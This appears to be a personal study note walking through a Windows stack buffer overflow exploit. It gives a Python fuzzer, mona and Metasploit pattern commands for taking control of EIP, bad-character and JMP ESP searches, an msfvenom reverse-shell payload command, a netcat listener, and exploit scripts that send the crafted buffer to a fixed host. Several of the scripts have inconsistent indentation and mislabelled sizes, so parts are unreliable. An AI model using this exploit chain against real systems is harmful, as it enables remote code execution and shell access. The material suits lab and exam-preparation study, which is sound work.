##### BufferOverflow

To exploit this application via buffer overflow, firstly the application must be crashed. This is done by using the fuzzer below. 
This fuzzer will send an array of incrasing values, where the value is "A", until the applcicaiton crashs and will leave you with the correct number of bytes needed
to crash the application.

fuzzy.py

```
#!/usr/bin/python

import socket, time, sys

IP = "<IP>"
PORT = <PORT>
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((IP, PORT))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(string)
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + IP + ":" + str(PORT))
        sys.exit(0)
    time.sleep(1)
    ```
    
    Once the application has been crashed. It is time to overwrite and take controll of the EIP poiter. To do this I will create a unique pattern using
    msf-pattern-create, using the gratest size of bytes used to crash the application via the fuzzer.

Create a working directory for !mona
```    
!mona config -set workingfolder c:\mona\%p
```

Create a pattern to overwrite

```msf-pattern_create -l <i.e 2560 or 0xA00>```

Find the offset

```msf-pattern_offset -l <i.e 2560 or 0xA00> -q <i.e 33794332>```

Once the offset has been found. In this case 2288, over the original 2560.

Creating the inputBuffer

filler = 'A' * 0x8f0 #2288   This is the space to write to get to EIP
eip = 'B' * 0x4      #4      This is the space we need to take over EIP
buffer = 'C' * 0x616 #268    This is for Shellcode ;~)

This should equal 2560 as the original size of the pattern created. 

To test this

exploit.py 
```
#!usr/bin/python

import socket
import time
import sys


try:
	print "Checking...."

	filler = 'A' * 0x8f0 #2288  
  eip = 'B' * 0x4     
  buffer = 'C' * 0x616 #268  

	inputBuffer = filler + eip + buffer

	content = inputBuffer 

	buffer+= content

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.178.10", 80))
	s.send(buffer)

	s.close()

	print 'Done! =]'

except:
	print "No Connection --------"
	sys.exit()
  ```
Run check.py, EIP should be equal to 42424242 (hex value of “BBBB”). I now control EIP!

Now that EIP has been controlled, it is crucical to gather a list of bad charecters, when the shellcode is generated any invalid charecters could
stop the payload from being read through the application. 

Finding bad charecters with !mona. .\x00 is always concidered a bad charecter as it will trucate shellcode when executed.

Creating a list of badchars
```
!mona bytearray -b "\x00"
``` This will exlcude the bad charecters
```
!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>
``` 
This will compare the remaining list against the application. 

Repeat those two steps until the results status returns Unmodified, this indicates that no more bad characters exist.

Finding JMP ESP

Now that control of EIP has been taken, and all bad charecters have been elmininated, next thing needed is and adress to jump to ESP.
This can found using !mona.

To load mona modules:
```
!mona modules
```

Finding a .dll were Rebase, SafeSEH, ASLR, NXCompat are sets to False. When you found it, run the command below to search for a 
JMP ESP (FFE4), inside the dll :
```
!mona find -s "\xff\xe4" -m <DLL>
```
Return address
Choose an address in the results and update exploit.py :
Setting the retn variable to the address, written backwards (little-endian)

```
# Example of a JMP ESP address

0x625011af

# exploit.py
retn
eip = "\xaf\x11\x50\x62"
```

Generate the shellcode 
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -f c
```

Prepend NOPs

A NOP-sled is a technique for exploiting stack buffer overflows. It solves the problem of finding the exact address of the buffer by effectively increasing the 
size of the target area, \x90 represents a NOP in assembly. This instruction will literally do nothing and continue on with code execution.
```
padding = "\x90" * 16
```

Start a nc listener on port 1234

```
sudo nc -lnvp 1234
```

Final Exploit

exploit.py 
```
#!usr/bin/python

import socket
import time
import sys


try:
	print "Checking...."

	filler = 'A' * FillerNum 
  eip = ''  EIP ADDRESS 
  buffer = 'C' * 0x616 #268  
  padding = "\x90" * 16
  
  ## Generate Shellcode Command: msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -f c
  ## Bad Charecters: 
  
  shellcode = 
  
	inputBuffer = filler + eip + padding + shellcode + buffer

	content = inputBuffer 

	buffer += content

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.178.10", 80))
	s.send(buffer)

	s.close()

	print 'Done! =]'

except:
	print "No Connection --------"
	sys.exit()
  ```




